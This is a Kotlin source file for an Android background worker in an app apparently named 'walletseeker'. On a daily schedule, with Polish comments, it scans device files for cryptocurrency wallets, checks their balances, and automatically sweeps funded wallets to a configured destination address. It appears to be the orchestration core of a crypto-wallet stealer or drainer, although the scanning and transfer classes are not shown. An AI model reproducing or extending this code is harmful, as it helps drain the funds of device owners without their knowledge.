package com.hackerai.walletseeker.service

import android.content.Context
import android.util.Log
import androidx.work.*
import com.hackerai.walletseeker.data.model.WalletStatus
import com.hackerai.walletseeker.data.rpc.BalanceChecker
import com.hackerai.walletseeker.data.scanner.FileScanner
import com.hackerai.walletseeker.data.transfer.TransferManager
import com.hackerai.walletseeker.domain.AppConfig
import kotlinx.coroutines.flow.toList
import java.io.File
import java.util.concurrent.TimeUnit

class ScanWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        return try {
            val configFile = File(applicationContext.filesDir, "config.json")
            val config = AppConfig.load(configFile)

            Log.d(TAG, "Starting scheduled scan")

            // Skanuj
            val scanner = FileScanner(applicationContext, config)
            val scanResults = scanner.scanForWallets().toList()
            val lastResult = scanResults.lastOrNull()
            val wallets = lastResult?.wallets ?: emptyList()

            if (wallets.isEmpty()) {
                Log.d(TAG, "No wallets found")
                return Result.success()
            }

            // Sprawdź salda
            val checker = BalanceChecker(config)
            val checkedWallets = mutableListOf<com.hackerai.walletseeker.data.model.WalletModel>()

            checker.checkAllBalances(wallets).toList().forEach { wallet ->
                checkedWallets.add(wallet)
            }

            // Zlicz znalezione fundusze
            val fundsCount = checkedWallets.count {
                it.status == WalletStatus.HAS_FUNDS || it.status == WalletStatus.HAS_TOKENS
            }

            Log.d(TAG, "Scan complete: $fundsCount wallets with funds")

            // Auto-sweep jeśli włączony
            if (config.autoTransferEnabled && config.destinationWallet.isNotBlank()) {
                val transferManager = TransferManager(config)
                for (wallet in checkedWallets) {
                    if (wallet.status == WalletStatus.HAS_FUNDS) {
                        val result = transferManager.sweepWallet(wallet)
                        Log.d(TAG, "Auto-sweep result: ${result.success} ${result.txHash}")
                    }
                }
            }

            // Aktualizuj timestamp ostatniego skanu
            val updatedConfig = config.copy(lastScanTimestamp = System.currentTimeMillis())
            updatedConfig.save(configFile)

            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Scan worker failed: ${e.message}", e)
            Result.retry()
        }
    }

    companion object {
        const val TAG = "ScanWorker"
        const val WORK_NAME = "wallet_seeker_periodic_scan"

        fun schedule(context: Context, intervalHours: Long = 24) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .setRequiresCharging(false)
                .build()

            val request = PeriodicWorkRequestBuilder<ScanWorker>(
                intervalHours, TimeUnit.HOURS,
                15, TimeUnit.MINUTES // flex interval
            )
                .setConstraints(constraints)
                .setBackoffCriteria(
                    BackoffPolicy.EXPONENTIAL,
                    1,
                    TimeUnit.MINUTES
                )
                .addTag(TAG)
                .build()

            WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(
                    WORK_NAME,
                    ExistingPeriodicWorkPolicy.KEEP,
                    request
                )

            Log.d(TAG, "Scheduled scan every $intervalHours hours")
        }

        fun cancel(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME)
            Log.d(TAG, "Cancelled scheduled scan")
        }

        fun isScheduled(context: Context): Boolean {
            val workManager = WorkManager.getInstance(context)
            val status = workManager.getWorkInfosForUniqueWork(WORK_NAME).get()
            return status.any { it.state == WorkInfo.State.ENQUEUED || it.state == WorkInfo.State.RUNNING }
        }
    }
}